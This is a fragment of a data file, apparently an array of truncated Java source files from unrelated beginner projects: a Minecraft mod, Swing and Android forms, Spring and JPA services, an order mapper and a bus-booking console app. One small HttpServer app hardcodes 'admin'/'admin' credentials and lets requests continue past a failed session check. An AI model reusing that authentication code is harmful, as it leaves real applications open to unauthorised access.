client.getWindow().getScaledWidth();\n        int windowHeight = client.getWindow().getScaledHeight();\n\n        int x = random.nextInt(windowWidth);\n        int y = random.nextInt(windowHeight);\n\n        x = Math.max(0, Math.min(windowWidth - 1, x));\n        y = Math.max(0, Math.min(windowHeight - 1, y));\n\n        int size = random.nextInt(300 - 50 + 1) + 50;\n\n        potatoes.add(new Potato(x, y, size));\n\n        client.getSoundManager().play(PositionedSoundInstance.master(SoundEvents.ENTITY_VILLAGER_AMBIENT, 1.0F));\n    }\n\n    public void stopSpawning() {\n        if (spawnTimer != null) {\n            spawnTimer.cancel();\n            spawnTimer.purge();\n        }\n    }\n\n    public List<Potato> getPotatoes() {\n        return potatoes;\n    }\n}",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage Vistas;\n\nimport modelo.Producto;\n\n/**\n *\n * @author Ferrando Carlos\n */\npublic class ProductoView extends javax.swing.JFrame {\n\n    /**\n     * Creates new form VistasProductos\n     */\n    public ProductoView() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jpIngresoProducto = new javax.swing.JPanel();\n        jlCategoria = new javax.swing.JLabel();\n        jcbCategoria = new javax.swing.JComboBox<>();\n        jLabel2 = new javax.swing.JLabel();\n        jpProducto = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jtProductoNombre = new javax.swing.JTextField();\n        jLabel3 = new javax.swing.JLabel();\n        jtProductoPrecio = new javax.swing.JTextField();\n        jLabel4 = new javax.swing.JLabel();\n        jButton1 = new javax.swing.JButton();\n        jLabel5 = new javax.swing.JLabel();\n        jButton2 = new javax.swing.JButton();\n        jLabel6 = new javax.swing.JLabel();\n        jpTabla = new javax.swing.JPanel();\n        jspTabla = new javax.swing.JScrollPane();\n        jtProductosTabla = new javax.swing.JTable();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setTitle(\"PRODUCTOS \");\n        setSize(new java.awt.Dimension(800, 600));\n        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());\n\n        jpIngresoProducto.setBackground(new java.awt.Color(255, 255, 255));\n\n        jlCategoria.setFont(new java.awt.Font(\"Comic Sans MS\", 0, 14)); // NOI18N\n        jlCategoria.setForeground(new java.awt.Color(0, 0, 0));\n        jlCategoria.setText(\"INGRESO DE PRODUCTOS\");\n\n        jcbCategoria.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jcbCategoriaActionPerformed(evt);\n            }\n        });\n\n        jLabel2.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jLabel2.setForeground(new java.awt.Color(0, 0, 0));\n        jLabel2.setText(\"Categorias\");\n\n        jpProducto.setName(\"DATOS PRODUCTO\"); // NOI18N\n\n        jLabel1.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(0, 0, 0));\n        jLabel1.setText(\"Nombre\");\n\n        jLabel3.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jLabel3.setForeground(new java.awt.Color(0, 0, 0));\n        jLabel3.setText(\"Precio\");\n\n        jLabel4.setText(\"Datos del Producto\");\n\n        javax.swing.GroupLayout jpProductoLayout = new javax.swing.GroupLayout(jpProducto);\n        jpProducto.setLayout(jpProductoLayout);\n        jpProductoLayout.setHorizontalGroup(\n            jpProductoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jtProductoNombre, javax.swing.GroupLayout.Alignment.TRAILING)\n            .addComponent(jtProductoPrecio)\n            .addGroup(jpProductoLayout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jpProductoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addComponent(jLabel1)\n                    .addComponent(jLabel3)\n                    .addComponent(jLabel4))\n                .addContainerGap(174, Short.MAX_VALUE))\n        );\n        jpProductoLayout.setVerticalGroup(\n            jpProductoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jpProductoLayout.createSequentialGroup()\n                .addGap(8, 8, 8)\n                .addComponent(jLabel4)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jLabel1)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addComponent(jtProductoNombre, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addComponent(jLabel3)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jtProductoPrecio, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(10, Short.MAX_VALUE))\n        );\n\n        jButton1.setFont(new java.awt.Font(\"Arial Black\", 1, 18)); // NOI18N\n        jButton1.setText(\"+\");\n        jButton1.addActionListener(new java.awt.event.Action",
    "package app.persistence;\n\nimport app.entities.*;\nimport app.exceptions.DatabaseException;\n\nimport java.sql.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.sql.Connection;\n\npublic class OrderMapper {\n    public static List<Order> getAllUserOrders(int userId, ConnectionPool connectionPool) throws DatabaseException {\n\n        List<Order> listOfAllOrders = new ArrayList<>();\n\n        String sql = \"SELECT public.order.order_id, bottom.flavor AS bottomflavor, topping.flavor AS toppingflavor,\" +\n                \" cupcakedetail.price_each AS priceeach, cupcakedetail.amount AS amount, (price_each * amount) AS totalprice \\n\" +\n                \"FROM public.order\\n\" +\n                \"INNER JOIN public.orderline ON public.order.order_id = orderline.order_id\\n\" +\n                \"INNER JOIN users ON public.order.user_id = users.user_id\\n\" +\n                \"INNER JOIN cupcakedetail ON orderline.cupcakedetail_id = cupcakedetail.cupcakedetail_id\\n\" +\n                \"INNER JOIN bottom ON cupcakedetail.bottom_id = bottom.bottom_id\\n\" +\n                \"INNER JOIN topping ON cupcakedetail.topping_id = topping.topping_id\\n\" +\n                \"WHERE public.order.user_id = ?\";\n\n        try (\n                Connection connection = connectionPool.getConnection();\n                PreparedStatement ps = connection.prepareStatement(sql)\n        ) {\n            ps.setInt(1, userId);\n            ResultSet rs = ps.executeQuery();\n            while (rs.next()) {\n                int orderId = rs.getInt(\"order_id\");\n                String bottomFlavor = rs.getString(\"bottomflavor\");\n                String toppingFlavor = rs.getString(\"toppingflavor\");\n                int priceEach = rs.getInt(\"priceeach\");\n                int amount = rs.getInt(\"amount\");\n                int totalPrice = rs.getInt(\"totalprice\");\n\n                List<Cupcake> listofCupcakes = new ArrayList<>();\n\n                listofCupcakes.add(new Cupcake(new Topping(toppingFlavor), new Bottom(bottomFlavor), priceEach, amount, totalPrice));\n\n                listOfAllOrders.add(new Order(orderId, userId, listofCupcakes));\n            }\n        } catch (SQLException e) {\n            throw new DatabaseException(\"Fejl i SQL!!\", e.getMessage());\n        }\n        return listOfAllOrders;\n    }\n\n    public static List<Order> getAllOrders(ConnectionPool connectionPool) throws DatabaseException {\n\n        List<Order> listOfAllOrders = new ArrayList<>();\n\n        String sql = \"SELECT public.order.order_id, public.order.user_id, bottom.flavor AS bottomflavor, topping.flavor AS toppingflavor,\" +\n                \" cupcakedetail.price_each AS priceeach, cupcakedetail.amount AS amount, (price_each * amount) AS totalprice \\n\" +\n                \"FROM public.order\\n\" +\n                \"INNER JOIN public.orderline ON public.order.order_id = orderline.order_id\\n\" +\n                \"INNER JOIN users ON public.order.user_id = users.user_id\\n\" +\n                \"INNER JOIN cupcakedetail ON orderline.cupcakedetail_id = cupcakedetail.cupcakedetail_id\\n\" +\n                \"INNER JOIN bottom ON cupcakedetail.bottom_id = bottom.bottom_id\\n\" +\n                \"INNER JOIN topping ON cupcakedetail.topping_id = topping.topping_id\\n\";\n        try (\n                Connection connection = connectionPool.getConnection();\n                PreparedStatement ps = connection.prepareStatement(sql)\n        ) {\n            ResultSet rs = ps.executeQuery();\n            while (rs.next()) {\n                int orderId = rs.getInt(\"order_id\");\n                int userId = rs.getInt(\"user_id\");\n                String bottomFlavor = rs.getString(\"bottomflavor\");\n                String toppingFlavor = rs.getString(\"toppingflavor\");\n                int priceEach = rs.getInt(\"priceeach\");\n                int amount = rs.getInt(\"amount\");\n                int totalPrice = rs.getInt(\"totalprice\");\n\n                List<Cupcake> listofCupcakes = new ArrayList<>();\n\n                listofCupcakes.add(new Cupcake(new Topping(toppingFlavor), new Bottom(bottomFlavor), priceEach, amount, totalPrice));\n\n                listOfAllOrders.add(new Order(orderId, userId, listofCupcakes));\n            }\n        } catch (SQLException e) {\n            throw new DatabaseException(\"Fejl i SQL!!\", e.getMessage());\n        }\n        return listOfAllOrders;\n    }\n\n    public static void deleteOrderLine(int orderId, ConnectionPool connectionPool) throws DatabaseException {\n        String sqlOrderLine = \"DELETE FROM orderline WHERE order_id = ?\";\n        String sqlOrder = \"DELETE FROM public.order WHERE order_id = ?\";\n\n        try (Connection connection = connectionPool.getConnection();\n             PreparedStatement psDeleteOrderLines = connection.prepareStatement(sqlOrderLine);\n             PreparedStatement psDeleteOrder = connection.prepareStatement(sqlOrder)) {\n\n            // Delete order lines first\n            psDeleteOrderLines.setInt(1, orderId);\n            psDeleteOrderLines.executeUpdate();\n\n            // Then d",
    "package com.qsp.employeemanagementsystem.exception;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.HttpStatusCode;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.validation.FieldError;\nimport org.springframework.validation.ObjectError;\nimport org.springframework.web.bind.MethodArgumentNotValidException;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\nimport org.springframework.web.context.request.WebRequest;\nimport org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;\n\nimport com.qsp.employeemanagementsystem.util.ResponseStructure;\n\n@RestControllerAdvice\npublic class ApplicationExceptionHandler extends ResponseEntityExceptionHandler {\n\n\t@ExceptionHandler(IdNotFoundExceprtion.class)\n\tpublic ResponseEntity<ResponseStructure<String>> handleIdNotFoundException(IdNotFoundExceprtion ex) {\n\n\t\tResponseStructure<String> structure = new ResponseStructure<String>();\n\t\tSystem.out.println(\"ApplicationExceptionHandler.handleIdNotFoundException()\");\n\t\tstructure.setMassage(\"Employee with given id not found\");\n\t\tstructure.setStatus(HttpStatus.NOT_FOUND.value());\n\t\tstructure.setData(ex.getMessage());\n\n\t\treturn new ResponseEntity<ResponseStructure<String>>(structure, HttpStatus.NOT_FOUND);\n\n\t}\n\n\t@ExceptionHandler(PhoneNotFoundException.class)\n\tpublic ResponseEntity<ResponseStructure<String>> handlePhoneNotFoundException(PhoneNotFoundException ex) {\n\n\t\tResponseStructure<String> structure = new ResponseStructure<String>();\n\t\tSystem.out.println(\"ApplicationExceptionHandler.handleIdNotFoundException()\");\n\t\tstructure.setMassage(\"Employee with given phone not found\");\n\t\tstructure.setStatus(HttpStatus.NOT_FOUND.value());\n\t\tstructure.setData(ex.getMessage());\n\n\t\treturn new ResponseEntity<ResponseStructure<String>>(structure, HttpStatus.NOT_FOUND);\n\n\t}\n\n\t@ExceptionHandler(EmailNotFoundException.class)\n\tpublic ResponseEntity<ResponseStructure<String>> handleIdNotFoundException(EmailNotFoundException ex) {\n\n\t\tResponseStructure<String> structure = new ResponseStructure<String>();\n\t\tSystem.out.println(\"ApplicationExceptionHandler.handleIdNotFoundException()\");\n\t\tstructure.setMassage(\"Employee with given email not found\");\n\t\tstructure.setStatus(HttpStatus.NOT_FOUND.value());\n\t\tstructure.setData(ex.getMessage());\n\n\t\treturn new ResponseEntity<ResponseStructure<String>>(structure, HttpStatus.NOT_FOUND);\n\n\t}\n\n\t@ExceptionHandler(NoDataAvailableException.class)\n\tpublic ResponseEntity<ResponseStructure<String>> handleIdNotFoundException(NoDataAvailableException ex) {\n\n\t\tResponseStructure<String> structure = new ResponseStructure<String>();\n\t\tSystem.out.println(\"ApplicationExceptionHandler.handleIdNotFoundException()\");\n\t\tstructure.setMassage(\"Employee with given data  not found\");\n\t\tstructure.setStatus(HttpStatus.NOT_FOUND.value());\n\t\tstructure.setData(ex.getMessage());\n\n\t\treturn new ResponseEntity<ResponseStructure<String>>(structure, HttpStatus.NOT_FOUND);\n\n\t}\n\n\t@Override\n\tprotected ResponseEntity<Object> handleMethodArgumentNotValid(MethodArgumentNotValidException ex,\n\t\t\tHttpHeaders headers, HttpStatusCode status, WebRequest request) {\n\n\t\tList<ObjectError> objectErrors = ex.getAllErrors();\n\t\tMap<String, String> map = new HashMap<String, String>();\n\t\tfor (ObjectError objectError : objectErrors) {\n\t\t\tFieldError error = (FieldError) objectError;\n\t\t\tString fieldName = error.getField();\n\t\t\tString message = error.getDefaultMessage();\n\n\t\t\tmap.put(fieldName, message);\n\n\t\t}\n\t\treturn new ResponseEntity<Object>(map, HttpStatus.BAD_REQUEST);\n\t}\n\n}\n",
    "package br.fmu.aula2an;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.text.Editable;\nimport android.text.TextWatcher;\nimport android.widget.EditText;\nimport android.widget.SeekBar;\nimport android.widget.TextView;\n\nimport java.text.NumberFormat;\n\npublic class GorjetaActivity extends AppCompatActivity {\n\n    private EditText editTextValor;\n    private TextView textViewValor;\n    private SeekBar seekBar;\n    private TextView textViewPorcentagem;\n    private TextView textViewGorjeta;\n    private TextView textViewTotal;\n    private Double porcentagem = 0.0;\n    private Double valor = 0.0;\n    private NumberFormat currencyFormat = NumberFormat.getCurrencyInstance();\n    private NumberFormat percentFormat = NumberFormat.getPercentInstance();\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_gorjeta);\n        editTextValor = findViewById(R.id.editTextValor);\n        textViewValor = findViewById(R.id.textViewValor);\n        textViewPorcentagem = findViewById(R.id.textViewPorcentagem);\n        seekBar = findViewById(R.id.seekBar);\n        textViewGorjeta = findViewById(R.id.textViewGorjeta);\n        textViewTotal = findViewById(R.id.textViewTotal);\n\n        editTextValor.addTextChangedListener(new TextWatcher() {\n            @Override\n            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}\n\n            @Override\n            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {\n                int valorInt;\n                try {\n                    valorInt = Integer.parseInt(editTextValor.getText().toString());\n                } catch ( NumberFormatException e ) {\n                    valorInt = 0;\n                }\n                valor = valorInt/100.0;\n                atualizarValores();\n            }\n\n            @Override\n            public void afterTextChanged(Editable editable) {}\n        });\n\n        seekBar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {\n            @Override\n            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {\n                porcentagem = progress/100.0;\n                atualizarValores();\n            }\n\n            @Override\n            public void onStartTrackingTouch(SeekBar seekBar) {}\n\n            @Override\n            public void onStopTrackingTouch(SeekBar seekBar) {}\n        });\n    }\n\n    private void atualizarValores() {\n        textViewValor.setText(currencyFormat.format(valor));\n        textViewPorcentagem.setText(percentFormat.format(porcentagem));\n        double gorjeta = valor * porcentagem;\n        textViewGorjeta.setText(currencyFormat.format(gorjeta));\n        double total = valor + gorjeta;\n        textViewTotal.setText(currencyFormat.format(total));\n    }\n}",
    "package net.devdyna.decor.common.register.tab;\n\nimport net.devdyna.decor.Decor;\nimport net.devdyna.decor.common.register.item.DecorItem;\nimport net.devdyna.decor.common.register.block.DecorBlock;\nimport net.minecraft.core.registries.Registries;\nimport net.minecraft.network.chat.Component;\nimport net.minecraft.world.item.CreativeModeTab;\nimport net.minecraft.world.item.ItemStack;\nimport net.minecraft.world.item.Items;\nimport net.minecraftforge.eventbus.api.IEventBus;\nimport net.minecraftforge.registries.DeferredRegister;\nimport net.minecraftforge.registries.RegistryObject;\n\npublic class DecorCreativeTab {\n    public static final DeferredRegister<CreativeModeTab> CREATIVE_MODE_TABS =\n            DeferredRegister.create(Registries.CREATIVE_MODE_TAB, Decor.MOD_ID);\n\n    public static final RegistryObject<CreativeModeTab> DECOR_TAB = CREATIVE_MODE_TABS.register(\"decor_tab\",\n            () -> CreativeModeTab.builder().icon(() -> new ItemStack(DecorBlock.RAINBOW.get()))\n                    .title(Component.translatable(\"creativetab.decor_tab\"))\n                    .displayItems((pParameters, pOutput) -> {\n                        pOutput.accept(DecorBlock.RAINBOW.get());\n                        pOutput.accept(DecorItem.DYE_ESSENCE.get());\n\t\t\t\t\t\tpOutput.accept(DecorItem.ICON.get());\n                    })\n                    .build());\n\n\n    public static void register(IEventBus eventBus) {\n        CREATIVE_MODE_TABS.register(eventBus);\n    }\n}\n",
    "import java.io.*;\nimport java.util.*;\nimport java.util.regex.*;\nimport java.net.*;\nimport com.sun.net.httpserver.*;\n\nclass Application {\n\n\tstatic String[] ignoreURIs = {\"favicon.ico\"};\n\n\tprivate static boolean checkCredentials(String user, String pwd) {\n\t\treturn user.equals(\"admin\") && pwd.equals(\"admin\");\n\t}\n\tprivate static String getURI(HttpExchange e) {\n\t\treturn e.getRequestURI().getPath();\n\t}\n\tprivate static String getQuery(HttpExchange e) {\n\t\treturn e.getRequestURI().getQuery();\n\t}\n\n\tpublic static void main(String[] args) throws IOException {\n\n\t\tLog.clearLog();\n\n\t\tint serverPort = 80;\n\t\tHttpServer server = HttpServer.create(new InetSocketAddress(serverPort), 0);\n\t\tserver.createContext(\"/\", (exchange -> {\n\t\t\tLog.log(\"NEW EXCHANGE: \" + getURI(exchange));\n\t\t\thandleRequest(exchange);\n\t\t\texchange.close();\n\t\t}));\n\n\t        server.setExecutor(null);\n\t        server.start();\n\t}\n\n\tprivate static void sendResponse(HttpExchange exchange, String rsp) throws IOException {\n\t\texchange.sendResponseHeaders(200, rsp.length());\n\t\tOutputStream output = exchange.getResponseBody();\n\t\toutput.write(rsp.getBytes());\n\t\toutput.flush();\n\t\texchange.close();\n\t}\n\n\n/*\tprivate static String decode(final String encoded) {\n\t\ttry {\n\t\t\treturn encoded == null ? null : URLDecoder.decode(encoded, \"UTF-8\");\n\t\t} catch (final UnsupportedEncodingException e) {\n\t\t\tthrow new RuntimeException(\"UTF-8 is a required encoding\", e);\n\t\t}\n\t}\n\n\n\tpublic static Map<String, List<String>> splitQuery(String query) {\n\t\tif (query == null || \"\".equals(query)) {\n\t\t\treturn Collections.emptyMap();\n\t\t}\n\n\t\treturn Pattern.compile(\"&\").splitAsStream(query)\n\t\t.map(s -> Arrays.copyOf(s.split(\"=\"), 2))\n\t\t.collect(groupingBy(s -> decode(s[0]), mapping(s -> decode(s[1]), toList())));\n\t}\n*/\n\tprivate static void handleRequest(HttpExchange exchange) throws IOException {\n\t\tString URI = getURI(exchange);\n\t\tHeaders hs = exchange.getRequestHeaders();\n\n\t\tfor (String s : FileManager.getOpenFiles()) {\n\t\t\tif (URI.equals(\"/file/\" + s)) {\n\t\t\t\tgetFile(exchange);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tfor (String s : ignoreURIs) {\n\t\t\tif (URI.equals(\"/\" + s)) {\n\t\t\t\tignoreExchange(exchange);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tif (URI.equals(\"/logout\")) {\n\t\t\tCredentialManager.logout(exchange);\n\t\t\tsendResponse(exchange, \"\");\n\t\t\treturn;\n\t\t}\n\t\tif (URI.equals(\"/login\")) {\n\t\t\tsendToLogin(exchange);\n\t\t\treturn;\n\t\t}\n\t\tif (URI.equals(\"/login/creds\")) {\n\t\t\tint token = CredentialManager.verifyCreds(exchange);\n\t\t\tif (token != -1) {\n\t\t\t\taddHeader(exchange, \"token\", token + \"\");\n\t\t\t\tsendResponse(exchange, \"\");\n\t\t\t}\n\t\t\tsendError(exchange);\n\t\t\treturn;\n\t\t}\n\t\tif (URI.equals(\"/login/creds/new\")) {\n\t\t\tint token = CredentialManager.createNewCreds(exchange);\n\t\t\tif (token != -1) {\n\t\t\t\taddHeader(exchange, \"token\", token + \"\");\n\t\t\t\tsendResponse(exchange, \"\");\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\tif (URI.equals(\"/login/new\")) {\n\t\t\tsendToNewLogin(exchange);\n\t\t\treturn;\n\t\t}\n\n\t\tint token = CredentialManager.getToken(exchange);\n\t\tboolean validSession = CredentialManager.validSession(token);\n\t\tif (!validSession)\n\t\t\tsendToLogin(exchange);\n\n\t\tif (URI.equals(\"/userdata\")) {\n\t\t\tsendUserData(exchange);\n\t\t\treturn;\n\t\t}\n\t\tif (URI.equals(\"/\")) {\n\t\t\tString rsp = FileManager.readFile(\"html/index.html\", false);\n\t\t\tSession session = CredentialManager.sessions.get(token);\n\t\t\tString username = session.getUsername();\n\t\t\taddHeader(exchange, \"username\", username);\n\t\t\tsendResponse(exchange, rsp);\n\t\t\treturn;\n\t\t}\n\t\tsendError(exchange);\n\t\treturn;\n\t}\n\n\tprivate static void sendError(int err, HttpExchange exchange) throws IOException {\n\t\tLog.log(\"sendError: \" + err);\n\t\texchange.sendResponseHeaders(err, -1);\n\t}\n\tprivate static void sendError(HttpExchange exchange) throws IOException {\n\t\tLog.log(\"sendError: 400\");\n\t\texchange.sendResponseHeaders(400, -1);\n\t}\n\n\tprivate static void getFile(HttpExchange exchange) throws IOException {\n\t\tString URI = getURI(exchange);\n\t\tString fname = URI.substring(URI.indexOf(\"file/\") + 5);\n\t\tString rsp = FileManager.readFile(fname, false);\n\t\tif (rsp == null) {\n\t\t\tsendError(exchange);\n\t\t\treturn;\n\t\t}\n\t\tsendResponse(exchange, rsp);\n\t\treturn;\n\t}\n\n\tprivate static void sendUserData(HttpExchange exchange) throws IOException {\n\t\tint token = CredentialManager.getToken(exchange);\n\t\tString username = CredentialManager.getUserData(token);\n\t\tString rsp = \"\";\n\t\taddHeader(exchange, \"username\", username);\n\t\tsendResponse(exchange, rsp);\n\t}\n\tprivate static void sendData(HttpExchange exchange) throws IOException {\n\t\tApteryxProcessor ap = new ApteryxProcessor();\n\t\tString rsp = ap.getResults();\n\t\tsendResponse(exchange, rsp);\n\t}\n\n\tprivate static void sendToLogin(HttpExchange exchange) throws IOException {\n\t\tLog.log(\"Send to login page\");\n\t\tString rsp = FileManager.readFile(\"html/login.html\", false);\n\t\tsendResponse(exchange, rsp);\n\t\treturn;\n\t}\n\tprivate static void ignoreExchange(HttpExchange exchange) throws IOException {\n\t\tLog.log(\"Ignored\");\n\t\tsendResponse(exchange, \"\");\n\t\treturn;\n\t}\n\tprivate static void sendToNewLogin(HttpExchange exchange) throws IOException {\n\t\tLog.log(\"Send to ne",
    "package com.projetowebspring.course.entities.pk;\n\nimport com.projetowebspring.course.entities.Order;\nimport com.projetowebspring.course.entities.Product;\nimport jakarta.persistence.Embeddable;\nimport jakarta.persistence.JoinColumn;\nimport jakarta.persistence.ManyToOne;\n\nimport java.io.Serializable;\nimport java.util.Objects;\n\n@Embeddable\npublic class OrderItemPK implements Serializable {\n    @ManyToOne\n    @JoinColumn(name = \"order_id\")\n    private Order order;\n\n    @ManyToOne\n    @JoinColumn(name = \"product_id\")\n    private Product product;\n\n    public Order getOrder() {\n        return order;\n    }\n\n    public void setOrder(Order order) {\n        this.order = order;\n    }\n\n    public Product getProduct() {\n        return product;\n    }\n\n    public void setProduct(Product product) {\n        this.product = product;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        OrderItemPK that = (OrderItemPK) o;\n        return Objects.equals(order, that.order) && Objects.equals(product, that.product);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(order, product);\n    }\n}\n",
    "package busBooking;\r\n\r\nimport java.util.*;\r\n\r\nclass bus{\r\n    String bustype;\r\n    String seattype;\r\n    int totalseats=12;\r\n    int nooftick;\r\n    int bookedseats;\r\n    int[][] seatview=new int[4][3];\r\n    \r\n    Scanner sc=new Scanner(System.in);\r\n    \r\n    bus(String bustype,String seattype)\r\n    {\r\n        int number=1;\r\n        this.bustype=bustype;\r\n        this.seattype=seattype;\r\n        for(int i=0;i<4;i++)\r\n         for(int j=0;j<3;j++)\r\n         {\r\n             seatview[i][j]=number;\r\n             number++;\r\n         }\r\n    }\r\n    void viewSeats()\r\n    {\r\n        System.out.println(\"*->Driver\\n\");\r\n        System.out.print(\"* \");\r\n        for(int i=0;i<4;i++)\r\n        {\r\n         for(int j=0;j<3;j++)\r\n         {\r\n        \t if(seatview[i][j]>0)\r\n        \t {\r\n                 System.out.print(\" \"+seatview[i][j]+\" \");\r\n        \t }\r\n        \t else if(seatview[i][j]==-1)\r\n        \t {\r\n        \t\t System.out.print(\" M \");\r\n        \t }\r\n        \t else\r\n        \t {\r\n        \t\t System.out.print(\" F \");\r\n        \t }\r\n         }\r\n         System.out.println();\r\n         if(i==1)\r\n         {\r\n             System.out.println(\"  ------>\");\r\n         }\r\n         System.out.print(\"  \");\r\n        }\r\n    }\r\n    public boolean checkAvail(int seatno)\r\n    {\r\n        boolean t=true;\r\n        for(int i=0;i<4;i++)\r\n            {\r\n                for(int j=0;j<3;j++)\r\n                {\r\n                    if(seatview[i][j]==seatno)\r\n                    {\r\n                        if(seatview[i][j]==-1 || seatview[i][j]==-2)\r\n                        {\r\n                            t=true;\r\n                        }\r\n                        else\r\n                        {\r\n                            t=false;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            return t;\r\n    }\r\n    public int[] book()\r\n    {\r\n        System.out.println(\"Enter no of tickets want to book\");\r\n        nooftick=sc.nextInt();\r\n        int[] seat=new int[nooftick];\r\n        for(int i1=0;i1<nooftick;i1++)\r\n        {\r\n            System.out.print(\"Enter seat number want to be booked:\");\r\n            int seatno=sc.nextInt();\r\n            System.out.print(\"Enter gender M or F:\");\r\n            char gender=sc.next().charAt(0);\r\n            if(seatno<1 || seatno>12)\r\n            {\r\n                System.out.println(\"Invalid seat number!!!\\nPlease choose seat between 1-12\");\r\n                seatno=0;\r\n                i1--;\r\n            }\r\n            else if(checkAvail(seatno))\r\n            {\r\n                System.out.println(\"Sorry entered seat is already booked...\\nPlease choose another seat\");\r\n                seatno=0;\r\n                i1--;\r\n            }\r\n            int gend;\r\n            if(gender=='F')\r\n             gend=-2;\r\n            else\r\n             gend=-1;\r\n            for(int i=0;i<4;i++)\r\n            {\r\n                for(int j=0;j<3;j++)\r\n                {\r\n                    if(seatview[i][j]==seatno)\r\n                    {\r\n                        if(gend==-2)\r\n                        {\r\n                            seatview[i][j]=gend;\r\n                        }\r\n                        else\r\n                        {\r\n                            if(((i+1)%2!=0 && seatview[i+1][j]==-2) || ((i+1)%2==0 && seatview[i-1][j]==-2))\r\n                            {\r\n                                System.out.println(\"Cannot book seat....Please choose male seat neighbour\");\r\n                                seatno=0;\r\n                                i1--;\r\n                            }\r\n                            else\r\n                            {\r\n                                seatview[i][j]=gend;\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            if(seatno!=0)\r\n             seat[i1]=seatno;\r\n        }\r\n        bookedseats+=seat.length;\r\n        return seat;\r\n    }\r\n    void deleteSeats(int[] bookedtickets)\r\n    {\r\n        for(int t:bookedtickets)\r\n        {\r\n            int seat=1,c=0;\r\n            for(int i=0;i<4;i++)\r\n            {\r\n                for(int j=0;j<3;j++)\r\n                {\r\n                    if(seat==t)\r\n                    {\r\n                        seatview[i][j]=seat;\r\n                        bookedseats--;\r\n                        c+=1;\r\n                        break;\r\n                    }\r\n                    seat++;\r\n                }\r\n                if(c>0)\r\n                {\r\n                \tbreak;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    double calculateFare(int nooftickets)\r\n    {\r\n        double fare;\r\n        if(bustype.equalsIgnoreCase(\"ac\") && seattype.equalsIgnoreCase(\"sleeper\"))\r\n        {\r\n            fare=nooftickets*1000.00;\r\n        }\r\n        else if(bustype.equalsIgnoreCase(\"ac\") && seattype.equalsIgnoreCase(\"seater\"))\r\n        {\r\n            fare=nooftickets*650.00;\r\n        }\r\n        else if(bustype.equalsIgnoreCase(\"Non-ac\") && seattype.equalsIgnoreC",
    "package ma.emsi.jpa.service;\n\nimport lombok.AllArgsConstructor;\nimport ma.emsi.jpa.entities.Role;\nimport ma.emsi.jpa.entities.User;\nimport ma.emsi.jpa.repositories.RoleRepository;\nimport ma.emsi.jpa.repositories.UserRepository;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.UUID;\n\n@Service\n@Transactional\n@AllArgsConstructor\npublic class UserServiceImpl implements UserService {\n    private UserRepository userRepository;\n    private RoleRepository roleRepository;\n\n    @Override\n    public User addNewUser(User user) {\n        user.setUserId(UUID.randomUUID().toString());\n        return userRepository.save(user);\n    }\n\n    @Override\n    public Role addNewRole(Role role) {\n        return roleRepository.save(role);\n    }\n\n    @Override\n    public User findUserByUserName(String userName) {\n        return userRepository.findByUsername(userName);\n    }\n\n    @Override\n    public Role findRoleByRoleName(String roleName) {\n        return roleRepository.findByRoleName(roleName);\n    }\n\n    @Override\n    public void addRoleToUser(String username, String roleName) {\n        User user = findUserByUserName(username);\n        Role role = 